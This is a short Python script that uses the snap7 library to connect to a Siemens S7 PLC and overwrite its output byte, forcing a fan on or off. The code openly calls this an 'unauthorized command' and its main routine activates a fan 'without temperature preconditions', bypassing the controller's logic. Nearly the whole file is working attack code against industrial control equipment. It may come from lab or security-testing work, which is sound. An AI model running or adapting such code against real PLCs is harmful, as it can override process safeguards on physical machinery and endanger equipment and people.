import snap7
import snap7.client as c
from snap7.util import *
from snap7.types import *
import socket

def find_plc_ip():
    """
    Scans the local network for the PLC's IP address.
    Replace this with actual network scanning logic or specify the IP manually.
    """
    # Example: Replace with actual PLC IP or network scanning logic
    plc_ip = "192.168.0.1"  # Replace with the actual PLC IP
    print(f"Found PLC at IP: {plc_ip}")
    return plc_ip

def send_unauthorized_command(plc_ip, fan, state):
    """
    Sends an unauthorized command to activate or deactivate a fan.
    :param plc_ip: IP address of the PLC
    :param fan: Fan to control ("Fan_A" or "Fan_B")
    :param state: Desired state (True for activate, False for deactivate)
    """
    try:
        # Create a Snap7 client and connect to the PLC
        plc = c.Client()
        plc.connect(plc_ip, 0, 1)  # IP, Rack, Slot

        # Map fan to its corresponding memory address
        fan_addresses = {
            "Fan_A": 0,  # %Q0.0
            "Fan_B": 1,  # %Q0.1
        }

        if fan not in fan_addresses:
            print(f"Invalid fan: {fan}")
            return

        # Read the output byte
        output_byte = plc.read_area(S7AreaPA, 0, 0, 1)  # Read the first output byte (%QB0)
        output_value = get_bool(output_byte, 0, fan_addresses[fan])

        # Set or reset the fan state
        set_bool(output_byte, 0, fan_addresses[fan], state)
        plc.write_area(S7AreaPA, 0, 0, output_byte)

        print(f"Sent unauthorized command: {fan} = {state}")

        # Disconnect from the PLC
        plc.disconnect()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()

    # Step 2: Send unauthorized command
    # Example: Activate Fan_A without temperature preconditions
    send_unauthorized_command(plc_ip, "Fan_A", True)